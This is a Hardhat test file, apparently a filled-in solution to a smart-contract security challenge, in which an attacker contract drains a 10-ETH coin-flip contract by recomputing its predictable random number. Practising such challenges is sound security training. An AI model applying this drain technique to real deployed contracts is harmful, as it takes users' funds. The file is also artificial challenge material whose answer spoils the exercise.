const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('[COIN FLIPPER EXPLOIT]', async function () {
    let deployer, attacker;

    const INITIAL_BALANCE = ethers.utils.parseEther('10');

    before(async function () {
        // SET UP
        ;[deployer, attacker] = await ethers.getSigners();

        this.rng = await (await ethers.getContractFactory('RandomNumber', deployer)).deploy();
        this.coinFlipper = await (await ethers.getContractFactory('CoinFlipper', deployer)).deploy(
            this.rng.address,
            { value: INITIAL_BALANCE }
        );

        expect(
            await ethers.provider.getBalance(this.coinFlipper.address)
        ).to.equal(INITIAL_BALANCE);
    });

    it('Exploit', async function () {
        // YOUR EXPLOIT HERE

        /*
        This exploit is done by calculating the same random number as the coinFlipper contract
        By doing this we always know the answer and can drain the contract of all the ETH.
        */

        this.exploit = await (await ethers.getContractFactory('CoinFlipperExploit', attacker))
            .deploy(this.coinFlipper.address);
        await this.exploit.connect(attacker).drain_eth({ value: ethers.utils.parseEther('10') });
        //await this.coinFlipper.connect(attacker).flip_coin(true, { value: ethers.utils.parseEther('1') });
    });

    after(async function () {
        // SUCCESS CONDITIONS
        expect(await ethers.provider.getBalance(this.coinFlipper.address)).to.be.equal('0');
    });
});
